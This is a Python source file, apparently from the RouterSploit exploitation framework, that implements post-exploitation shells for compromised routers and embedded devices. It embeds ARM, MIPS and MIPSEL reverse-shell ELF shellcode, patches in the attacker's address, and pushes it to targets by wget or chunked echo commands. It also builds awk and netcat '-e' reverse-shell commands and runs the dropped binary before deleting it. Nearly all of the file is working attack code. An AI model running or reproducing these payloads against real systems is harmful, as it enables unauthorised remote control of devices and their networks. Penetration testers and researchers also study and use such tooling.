import socket
import telnetlib
import SimpleHTTPServer
import BaseHTTPServer
import threading

from routersploit.utils import (
    print_info,
    print_error,
    print_success,
    print_status,
    random_text,
)


def shell(exploit, architecture="", method="", **params):
    while 1:
        cmd = raw_input("cmd > ")

        if cmd in ["quit", "exit"]:
            return

        c = cmd.split()
        if len(c) and c[0] == "reverse_tcp":
            if len(c) == 3:
                lhost = c[1]
                lport = c[2]

                revshell = reverse_shell(exploit, architecture, lhost, lport)

                if method == "wget":
                    revshell.wget(binary=params['binary'], location=params['location'])
                elif method == "echo":
                    revshell.echo(binary=params['binary'], location=params['location'])
                elif method == "awk":
                    revshell.awk(binary=params['binary'])
                elif method == "netcat":
                    revshell.netcat(binary=params['binary'], shell=params['shell'])
                else:
                    print_error("Reverse shell is not available")
            else:
                print_error("reverse_tcp <reverse ip> <port>")
        else:
            print_info(exploit.execute(cmd))


class HttpRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

        self.wfile.write(self.server.content)
        self.server.stop = True

    def log_message(self, format, *args):
        return


class HttpServer(BaseHTTPServer.HTTPServer):
    def serve_forever(self, content):
        self.stop = False
        self.content = content
        while not self.stop:
            self.handle_request()


class reverse_shell(object):
    arm = (
        # elf binary
        "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00"
        "\x00\x00\x74\x80\x00\x00\x34\x00\x00\x00\x70\x01\x00\x00\x02\x02\x00\x05\x34\x00\x20\x00"
        "\x02\x00\x28\x00\x07\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00\x80"
        "\x00\x00\x18\x01\x00\x00\x18\x01\x00\x00\x05\x00\x00\x00\x00\x80\x00\x00\x01\x00\x00\x00"
        "\x18\x01\x00\x00\x18\x01\x01\x00\x18\x01\x01\x00\x0b\x00\x00\x00\x0b\x00\x00\x00\x06\x00"
        "\x00\x00\x00\x80\x00\x00"
        # <_start>:
        "\x84\x70\x9f\xe5"  # ldr    r7, [pc, #132]
        "\x02\x00\xa0\xe3"  # mov    r0, #2
        "\x01\x10\xa0\xe3"  # mov    r1, #1
        "\x00\x20\xa0\xe3"  # mov    r2, #0
        "\x00\x00\x00\xef"  # svc    0x00000000
        "\x00\x60\xa0\xe1"  # mov    r6, r0
        "\x70\x50\x9f\xe5"  # ldr    r5, [pc, #112]  ; 8104 <loop+0x50>
        "\x04\x50\x2d\xe5"  # push   {r5}        ; (str r5, [sp, #-4]!)
        "\x6c\x50\x9f\xe5"  # ldr    r5, [pc, #108]  ; 8108 <loop+0x54>
        "\x04\x50\x2d\xe5"  # push   {r5}        ; (str r5, [sp, #-4]!)
        "\x0d\x10\xa0\xe1"  # mov    r1, sp
        "\x10\x20\xa0\xe3"  # mov    r2, #16
        "\x60\x70\x9f\xe5"  # ldr    r7, [pc, #96]   ; 810c <loop+0x58>
        "\x00\x00\x00\xef"  # svc    0x00000000
        "\x06\x00\xa0\xe1"  # mov    r0, r6
        "\x03\x10\xa0\xe3"  # mov    r1, #3
        # <loop>:
        "\x01\x10\x51\xe2"  # subs   r1, r1, #1
        "\x3f\x70\xa0\xe3"  # mov    r7, #63 ; 0x3f
        "\x00\x00\x00\xef"  # svc    0x00000000
        "\xfb\xff\xff\x1a"  # bne    80b4 <loop>
        "\x44\x00\x9f\xe5"  # ldr    r0, [pc, #68]   ; 8110 <loop+0x5c>
        "\x00\x10\xa0\xe1"  # mov    r1, r0
        "\x02\x20\x22\xe0"  # eor    r2, r2, r2
        "\x04\x20\x2d\xe5"  # push   {r2}        ; (str r2, [sp, #-4]!)
        "\x38\x10\x9f\xe5"  # ldr    r1, [pc, #56]   ; 8114 <loop+0x60>
        "\x04\x10\x2d\xe5"  # push   {r1}        ; (str r1, [sp, #-4]!)
        "\x0d\x10\xa0\xe1"  # mov    r1, sp
        "\x0b\x70\xa0\xe3"  # mov    r7, #11
        "\x00\x00\x00\xef"  # svc    0x00000000
        "\x00\x00\xa0\xe3"  # mov    r0, #0
        "\x01\x70\xa0\xe3"  # mov    r7, #1
        "\x00\x00\x00\xef"  # svc    0x00000000
        "\x01\x70\xa0\xe3"  # mov    r7, #1
        "\x00\x00\xa0\xe3"  # mov    r0, #0
        "\x00\x00\x00\xef"  # svc    0x00000000
        "\x19\x01\x00\x00"  # .word  0x00000119
        "\x7f\x00\x00\x01"  # .word  0x0100007f
        "\x02\x00\x11\x5c"  # .word  0x5c110002
        "\x1b\x01\x00\x00"  # .word  0x0000011b
        "\x18\x01\x01\x00"  # .word  0x00010118
        "\x20\x01\x01\x00"  # .word  0x00010120
        # elf binary
        "\x2f\x62\x69\x6e\x2f\x73\x68\x00\x73\x68\x00\x41\x13\x00\x00\x00\x61\x65\x61\x62\x69\x00"
        "\x01\x09\x00\x00\x00\x06\x01\x08\x01\x00\x2e\x73\x79\x6d\x74\x61\x62\x00\x2e\x73\x74\x72"
        "\x74\x61\x62\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x74\x65\x78\x74\x00\x2e\x64"
        "\x61\x74\x61\x00\x2e\x41\x52\x4d\x2e\x61\x74\x74\x72\x69\x62\x75\x74\x65\x73\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00"
        "\x01\x00\x00\x00\x06\x00\x00\x00\x74\x80\x00\x00\x74\x00\x00\x00\xa4\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x21\x00\x00\x00\x01\x00\x00\x00"
        "\x03\x00\x00\x00\x18\x01\x01\x00\x18\x01\x00\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x27\x00\x00\x00\x03\x00\x00\x70\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x23\x01\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00"
        "\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x37\x01\x00\x00\x37\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00"
        "\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x88\x02\x00\x00"
        "\x40\x01\x00\x00\x06\x00\x00\x00\x0c\x00\x00\x00\x04\x00\x00\x00\x10\x00\x00\x00\x09\x00"
        "\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x03\x00\x00\x70\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x80\x00\x00\x00\x00\x00\x00"
        "\x03\x00\x01\x00\x00\x00\x00\x00\x18\x01\x01\x00\x00\x00\x00\x00\x03\x00\x02\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x04\x00\xf1\xff\x0f\x00\x00\x00\x18\x01\x01\x00\x00\x00\x00\x00\x00\x00"
        "\x02\x00\x16\x00\x00\x00\x20\x01\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x19\x00\x00\x00"
        "\x74\x80\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x1c\x00\x00\x00\xb4\x80\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x01\x00\x21\x00\x00\x00\x00\x81\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\xf1\xff\x21\x00\x00\x00\x18\x01"
        "\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x24\x00\x00\x00\x23\x01\x01\x00\x00\x00\x00\x00"
        "\x10\x00\x02\x00\x2f\x00\x00\x00\x23\x01\x01\x00\x00\x00\x00\x00\x10\x00\x02\x00\x3d\x00"
        "\x00\x00\x23\x01\x01\x00\x00\x00\x00\x00\x10\x00\x02\x00\x49\x00\x00\x00\x74\x80\x00\x00"
        "\x00\x00\x00\x00\x10\x00\x01\x00\x50\x00\x00\x00\x23\x01\x01\x00\x00\x00\x00\x00\x10\x00"
        "\x02\x00\x5c\x00\x00\x00\x24\x01\x01\x00\x00\x00\x00\x00\x10\x00\x02\x00\x64\x00\x00\x00"
        "\x23\x01\x01\x00\x00\x00\x00\x00\x10\x00\x02\x00\x6b\x00\x00\x00\x24\x01\x01\x00\x00\x00"
        "\x00\x00\x10\x00\x02\x00\x00\x72\x65\x76\x65\x72\x73\x65\x5f\x74\x63\x70\x2e\x6f\x00\x62"
        "\x69\x6e\x61\x72\x79\x00\x73\x68\x00\x24\x61\x00\x6c\x6f\x6f\x70\x00\x24\x64\x00\x5f\x62"
        "\x73\x73\x5f\x65\x6e\x64\x5f\x5f\x00\x5f\x5f\x62\x73\x73\x5f\x73\x74\x61\x72\x74\x5f\x5f"
        "\x00\x5f\x5f\x62\x73\x73\x5f\x65\x6e\x64\x5f\x5f\x00\x5f\x73\x74\x61\x72\x74\x00\x5f\x5f"
        "\x62\x73\x73\x5f\x73\x74\x61\x72\x74\x00\x5f\x5f\x65\x6e\x64\x5f\x5f\x00\x5f\x65\x64\x61"
        "\x74\x61\x00\x5f\x65\x6e\x64\x00"
    )

    mipsel = (
        # elf binary
        "\x7f\x45\x4c\x46\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x01\x00"
        "\x00\x00\x90\x00\x40\x00\x34\x00\x00\x00\x8c\x01\x00\x00\x00\x10\x00\x50\x34\x00\x20\x00"
        "\x02\x00\x28\x00\x06\x00\x03\x00\x00\x00\x00\x70\x74\x00\x00\x00\x74\x00\x40\x00\x74\x00"
        "\x40\x00\x18\x00\x00\x00\x18\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\x60\x01\x00\x00\x60\x01\x00\x00\x05\x00"
        "\x00\x00\x00\x00\x01\x00\xf4\x11\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x50\x81\x41\x00\x00\x00\x00\x00"
        # <_ftext>:
        "\xff\xff\x04\x28"  # slti    a0,zero,-1
        "\xa6\x0f\x02\x24"  # li      v0,4006
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\x11\x11\x04\x28"  # slti    a0,zero,4369
        "\xa6\x0f\x02\x24"  # li      v0,4006
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\xfd\xff\x0c\x24"  # li      t4,-3
        "\x27\x20\x80\x01"  # nor     a0,t4,zero
        "\xa6\x0f\x02\x24"  # li      v0,4006
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\xfd\xff\x0c\x24"  # li      t4,-3
        "\x27\x20\x80\x01"  # nor     a0,t4,zero
        "\x27\x28\x80\x01"  # nor     a1,t4,zero
        "\xff\xff\x06\x28"  # slti    a2,zero,-1
        "\x57\x10\x02\x24"  # li      v0,4183
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\xff\xff\x44\x30"  # andi    a0,v0,0xffff
        "\xc9\x0f\x02\x24"  # li      v0,4041
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\xc9\x0f\x02\x24"  # li      v0,4041
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\x7a\x69\x05\x3c"  # lui     a1,0x697a
        "\x02\x00\xa5\x34"  # ori     a1,a1,0x2
        "\xf8\xff\xa5\xaf"  # sw      a1,-8(sp)
        "\x00\x01\x05\x3c"  # lui     a1,0x100
        "\x7f\x00\xa5\x34"  # ori     a1,a1,0x7f
        "\xfc\xff\xa5\xaf"  # sw      a1,-4(sp)
        "\xf8\xff\xa5\x23"  # addi    a1,sp,-8
        "\xef\xff\x0c\x24"  # li      t4,-17
        "\x27\x30\x80\x01"  # nor     a2,t4,zero
        "\x4a\x10\x02\x24"  # li      v0,4170
        "\x0c\x09\x09\x01"  # syscall 0x42424
        "\x62\x69\x08\x3c"  # lui     t0,0x6962
        "\x2f\x2f\x08\x35"  # ori     t0,t0,0x2f2f
        "\xec\xff\xa8\xaf"  # sw      t0,-20(sp)
        "\x73\x68\x08\x3c"  # lui     t0,0x6873
        "\x6e\x2f\x08\x35"  # ori     t0,t0,0x2f6e
        "\xf0\xff\xa8\xaf"  # sw      t0,-16(sp)
        "\xff\xff\x07\x28"  # slti    a3,zero,-1
        "\xf4\xff\xa7\xaf"  # sw      a3,-12(sp)
        "\xfc\xff\xa7\xaf"  # sw      a3,-4(sp)
        "\xec\xff\xa4\x23"  # addi    a0,sp,-20
        "\xec\xff\xa8\x23"  # addi    t0,sp,-20
        "\xf8\xff\xa8\xaf"  # sw      t0,-8(sp)
        "\xf8\xff\xa5\x23"  # addi    a1,sp,-8
        "\xec\xff\xbd\x27"  # addiu   sp,sp,-20
        "\xff\xff\x06\x28"  # slti    a2,zero,-1
        "\xab\x0f\x02\x24"  # li      v0,4011
        "\x0c\x09\x09\x01"  # syscall 0x42424
        # elf binary
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x73\x79\x6d\x74\x61\x62\x00\x2e"
        "\x73\x74\x72\x74\x61\x62\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x72\x65\x67\x69"
        "\x6e\x66\x6f\x00\x2e\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x00\x00\x00\x06\x00\x00\x70\x02\x00\x00\x00\x74\x00"
        "\x40\x00\x74\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00"
        "\x18\x00\x00\x00\x24\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00\x90\x00\x40\x00\x90\x00"
        "\x00\x00\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00"
        "\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x60\x01\x00\x00\x2a\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00"
        "\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x7c\x02\x00\x00\xc0\x00\x00\x00\x05\x00"
        "\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00\x10\x00\x00\x00\x09\x00\x00\x00\x03\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x03\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x74\x00\x40\x00\x00\x00\x00\x00\x03\x00\x01\x00\x00\x00"
        "\x00\x00\x90\x00\x40\x00\x00\x00\x00\x00\x03\x00\x02\x00\x01\x00\x00\x00\x60\x01\x41\x00"
        "\x00\x00\x00\x00\x10\x00\x02\x00\x08\x00\x00\x00\x50\x81\x41\x00\x00\x00\x00\x00\x10\x00"
        "\xf1\xff\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x14\x00\x00\x00"
        "\x90\x00\x40\x00\x00\x00\x00\x00\x10\x00\x02\x00\x1b\x00\x00\x00\x90\x00\x40\x00\x00\x00"
        "\x00\x00\x11\x00\x02\x00\x22\x00\x00\x00\x60\x01\x41\x00\x00\x00\x00\x00\x10\x00\xf1\xff"
        "\x2e\x00\x00\x00\x60\x01\x41\x00\x00\x00\x00\x00\x10\x00\xf1\xff\x35\x00\x00\x00\x60\x01"
        "\x41\x00\x00\x00\x00\x00\x10\x00\xf1\xff\x3a\x00\x00\x00\x60\x01\x41\x00\x00\x00\x00\x00"
        "\x10\x00\xf1\xff\x00\x5f\x66\x64\x61\x74\x61\x00\x5f\x67\x70\x00\x5f\x5f\x73\x74\x61\x72"
        "\x74\x00\x5f\x66\x74\x65\x78\x74\x00\x5f\x73\x74\x61\x72\x74\x00\x5f\x5f\x62\x73\x73\x5f"
        "\x73\x74\x61\x72\x74\x00\x5f\x65\x64\x61\x74\x61\x00\x5f\x65\x6e\x64\x00\x5f\x66\x62\x73"
        "\x73\x00"
    )

    mips = (
        # elf binary
        "\x7f\x45\x4c\x46\x01\x02\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x08\x00\x00"
        "\x00\x01\x00\x40\x00\x90\x00\x00\x00\x34\x00\x00\x01\x8c\x50\x00\x10\x00\x00\x34\x00\x20"
        "\x00\x02\x00\x28\x00\x06\x00\x03\x70\x00\x00\x00\x00\x00\x00\x74\x00\x40\x00\x74\x00\x40"
        "\x00\x74\x00\x00\x00\x18\x00\x00\x00\x18\x00\x00\x00\x04\x00\x00\x00\x04\x00\x00\x00\x01"
        "\x00\x00\x00\x00\x00\x40\x00\x00\x00\x40\x00\x00\x00\x00\x01\x60\x00\x00\x01\x60\x00\x00"
        "\x00\x05\x00\x01\x00\x00\x20\x00\x11\xf4\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x41\x81\x50\x00\x00\x00\x00"
        # <_ftext>:
        "\x28\x04\xff\xff"  # slti     a0,zero,-1
        "\x24\x02\x0f\xa6"  # li       v0,4006
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x28\x04\x11\x11"  # slti     a0,zero,4369
        "\x24\x02\x0f\xa6"  # li       v0,4006
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x24\x0c\xff\xfd"  # li       t4,-3
        "\x01\x80\x20\x27"  # nor      a0,t4,zero
        "\x24\x02\x0f\xa6"  # li       v0,4006
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x24\x0c\xff\xfd"  # li       t4,-3
        "\x01\x80\x20\x27"  # nor      a0,t4,zero
        "\x01\x80\x28\x27"  # nor      a1,t4,zero
        "\x28\x06\xff\xff"  # slti     a2,zero,-1
        "\x24\x02\x10\x57"  # li       v0,4183
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x30\x44\xff\xff"  # andi     a0,v0,0xffff
        "\x24\x02\x0f\xc9"  # li       v0,4041
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x24\x02\x0f\xc9"  # li       v0,4041
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x3c\x05\x00\x02"  # lui      a1,0x2
        "\x34\xa5\x7a\x69"  # ori      a1,a1,0x7a69
        "\xaf\xa5\xff\xf8"  # sw       a1,-8(sp)
        "\x3c\x05\xc0\xa8"  # lui      a1,0xc0a8
        "\x34\xa5\x01\x37"  # ori      a1,a1,0x137
        "\xaf\xa5\xff\xfc"  # sw       a1,-4(sp)
        "\x23\xa5\xff\xf8"  # addi     a1,sp,-8
        "\x24\x0c\xff\xef"  # li       t4,-17
        "\x01\x80\x30\x27"  # nor      a2,t4,zero
        "\x24\x02\x10\x4a"  # li       v0,4170
        "\x01\x09\x09\x0c"  # syscall  0x42424
        "\x3c\x08\x2f\x2f"  # lui      t0,0x2f2f
        "\x35\x08\x62\x69"  # ori      t0,t0,0x6269
        "\xaf\xa8\xff\xec"  # sw       t0,-20(sp)
        "\x3c\x08\x6e\x2f"  # lui      t0,0x6e2f
        "\x35\x08\x73\x68"  # ori      t0,t0,0x7368
        "\xaf\xa8\xff\xf0"  # sw       t0,-16(sp)
        "\x28\x07\xff\xff"  # slti     a3,zero,-1
        "\xaf\xa7\xff\xf4"  # sw       a3,-12(sp)
        "\xaf\xa7\xff\xfc"  # sw       a3,-4(sp)
        "\x23\xa4\xff\xec"  # addi     a0,sp,-20
        "\x23\xa8\xff\xec"  # addi     t0,sp,-20
        "\xaf\xa8\xff\xf8"  # sw       t0,-8(sp)
        "\x23\xa5\xff\xf8"  # addi     a1,sp,-8
        "\x27\xbd\xff\xec"  # addiu    sp,sp,-20
        "\x28\x06\xff\xff"  # slti     a2,zero,-1
        "\x24\x02\x0f\xab"  # li       v0,4011
        "\x00\x90\x93\x4c"  # syscall  0x2424d
        # elf binary
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x2e\x73\x79\x6d\x74\x61\x62\x00\x2e"
        "\x73\x74\x72\x74\x61\x62\x00\x2e\x73\x68\x73\x74\x72\x74\x61\x62\x00\x2e\x72\x65\x67\x69"
        "\x6e\x66\x6f\x00\x2e\x74\x65\x78\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x70\x00\x00\x06\x00\x00\x00\x02\x00\x40"
        "\x00\x74\x00\x00\x00\x74\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04"
        "\x00\x00\x00\x18\x00\x00\x00\x24\x00\x00\x00\x01\x00\x00\x00\x06\x00\x40\x00\x90\x00\x00"
        "\x00\x90\x00\x00\x00\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
        "\x00\x00\x00\x11\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x60\x00\x00"
        "\x00\x2a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01"
        "\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x7c\x00\x00\x00\xc0\x00\x00"
        "\x00\x05\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00\x00\x10\x00\x00\x00\x09\x00\x00\x00\x03"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x3c\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x74\x00\x00\x00\x00\x03\x00\x00\x01\x00\x00"
        "\x00\x00\x00\x40\x00\x90\x00\x00\x00\x00\x03\x00\x00\x02\x00\x00\x00\x01\x00\x41\x01\x60"
        "\x00\x00\x00\x00\x10\x00\x00\x02\x00\x00\x00\x08\x00\x41\x81\x50\x00\x00\x00\x00\x10\x00"
        "\xff\xf1\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x14"
        "\x00\x40\x00\x90\x00\x00\x00\x00\x10\x00\x00\x02\x00\x00\x00\x1b\x00\x40\x00\x90\x00\x00"
        "\x00\x00\x11\x00\x00\x02\x00\x00\x00\x22\x00\x41\x01\x60\x00\x00\x00\x00\x10\x00\xff\xf1"
        "\x00\x00\x00\x2e\x00\x41\x01\x60\x00\x00\x00\x00\x10\x00\xff\xf1\x00\x00\x00\x35\x00\x41"
        "\x01\x60\x00\x00\x00\x00\x10\x00\xff\xf1\x00\x00\x00\x3a\x00\x41\x01\x60\x00\x00\x00\x00"
        "\x10\x00\xff\xf1\x00\x5f\x66\x64\x61\x74\x61\x00\x5f\x67\x70\x00\x5f\x5f\x73\x74\x61\x72"
        "\x74\x00\x5f\x66\x74\x65\x78\x74\x00\x5f\x73\x74\x61\x72\x74\x00\x5f\x5f\x62\x73\x73\x5f"
        "\x73\x74\x61\x72\x74\x00\x5f\x65\x64\x61\x74\x61\x00\x5f\x65\x6e\x64\x00\x5f\x66\x62\x73"
        "\x73\x00"
    )

    exploit = None
    arch = None
    lhost = None
    lport = None
    binary_name = None
    revshell = None

    def __init__(self, exploit, arch, lhost, lport):
        self.exploit = exploit
        self.arch = arch
        self.lhost = lhost
        self.lport = lport

    def convert_ip(self, addr):
        res = ""
        for i in addr.split("."):
            res += chr(int(i))
        return res

    def convert_port(self, p):
        res = "%.4x" % int(p)
        return res.decode('hex')

    def generate_binary(self, lhost, lport):
        print_status("Generating reverse shell binary")
        self.binary_name = random_text(8)
        ip = self.convert_ip(lhost)
        port = self.convert_port(lport)

        if self.arch == 'arm':
            self.revshell = self.arm[:0x104] + ip + self.arm[0x108:0x10a] + port + self.arm[0x10c:]
        elif self.arch == 'mipsel':
            self.revshell = self.mipsel[:0xe4] + port + self.mipsel[0xe6:0xf0] + ip[2:] + self.mipsel[0xf2:0xf4] + ip[:2] + self.mipsel[0xf6:]
        elif self.arch == 'mips':
            self.revshell = self.mips[:0xea] + port + self.mips[0xec:0xf2] + ip[:2] + self.mips[0xf4:0xf6] + ip[2:] + self.mips[0xf8:]
        else:
            print_error("Platform not supported")

    def http_server(self, lhost, lport):
        print_status("Setting up HTTP server")
        server = HttpServer((lhost, int(lport)), HttpRequestHandler)

        server.serve_forever(self.revshell)
        server.server_close()

    def wget(self, binary, location):
        print_status("Using wget method")
        # generate binary
        self.generate_binary(self.lhost, self.lport)

        # run http server
        thread = threading.Thread(target=self.http_server, args=(self.lhost, self.lport))
        thread.start()

        # wget binary
        print_status("Using wget to download binary")
        cmd = "{} http://{}:{}/{} -O {}/{}".format(binary,
                                                   self.lhost,
                                                   self.lport,
                                                   self.binary_name,
                                                   location,
                                                   self.binary_name)

        self.exploit.execute(cmd)

        # execute binary
        sock = self.listen(self.lhost, self.lport)
        self.execute_binary(location, self.binary_name)

        # waiting for shell
        self.shell(sock)

    def echo(self, binary, location):
        print_status("Using echo method")

        # generate binary
        self.generate_binary(self.lhost, self.lport)
        path = "{}/{}".format(location, self.binary_name)

        size = len(self.revshell)
        num_parts = (size / 30) + 1

        # transfer binary through echo command
        print_status("Using echo method to transfer binary")
        for i in range(0, num_parts):
            current = i * 30
            print_status("Transferring {}/{} bytes".format(current, len(self.revshell)))

            block = self.revshell[current:current + 30].encode('hex')
            block = "\\x" + "\\x".join(a + b for a, b in zip(block[::2], block[1::2]))
            cmd = '$(echo -n -e "{}" >> {})'.format(block, path)
            self.exploit.execute(cmd)

        # execute binary
        sock = self.listen(self.lhost, self.lport)
        self.execute_binary(location, self.binary_name)

        # waiting for shell
        self.shell(sock)

    def awk(self, binary):
        print_status("Using awk method")

        # run reverse shell through awk
        sock = self.listen(self.lhost, self.lport)
        cmd = binary + " 'BEGIN{s=\"/inet/tcp/0/" + self.lhost + "/" + self.lport + "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)};'"
        self.exploit.execute(cmd)

        # waiting for shell
        self.shell(sock)

    def netcat(self, binary, shell):
        # run reverse shell through netcat
        sock = self.listen(self.lhost, self.lport)
        cmd = "{} {} {} -e {}".format(binary, self.lhost, self.lport, shell)

        self.exploit.execute(cmd)

        # waiting for shell
        self.shell(sock)

    def execute_binary(self, location, binary_name):
        path = "{}/{}".format(location, binary_name)
        cmd = "chmod 777 {}; {}; rm {}".format(path, path, path)

        thread = threading.Thread(target=self.exploit.execute, args=(cmd,))
        thread.start()

    def listen(self, lhost, lport):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((lhost, int(lport)))
        sock.listen(5)
        return sock

    def shell(self, sock):
        print_status("Waiting for reverse shell...")
        client, addr = sock.accept()
        sock.close()
        print_status("Connection from {}:{}".format(addr[0], addr[1]))

        print_success("Enjoy your shell")
        t = telnetlib.Telnet()
        t.sock = client
        t.interact()
